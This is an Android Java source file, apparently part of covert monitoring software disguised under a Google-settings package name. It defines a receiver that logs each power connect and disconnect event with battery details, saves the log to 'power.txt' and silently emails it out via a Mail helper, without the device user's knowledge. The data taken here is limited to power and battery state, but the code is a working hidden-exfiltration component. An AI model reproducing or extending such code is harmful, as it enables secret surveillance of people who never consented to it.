package com.setting.dl.google.googlesettings.mail;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.u;

import java.util.Date;


public class PowerConnectionLestener extends BroadcastReceiver {
    
    private final static String filePower = "power.txt";
    
    @Override
    public void onReceive(final Context context, Intent intent) {
        
        String action = intent.getAction();
        final String[] value = {u.getDate(new Date().getTime())};
        
        if (action != null && action.equals("android.intent.action.ACTION_POWER_CONNECTED")) {
    
            value[0] += "\nPower Connected\n";
        }
        else{
    
            value[0] += "\nPower Disconnected\n";
        }
    
    
        u.runThread(() -> {
    
            value[0] += new Battery(context).doInBackground();
            value[0] += "********************\n";
            u.saveValue(context, filePower, value[0]);
    
            Mail.send(context, filePower);
            
        }, 10000);
        
        
    }
}
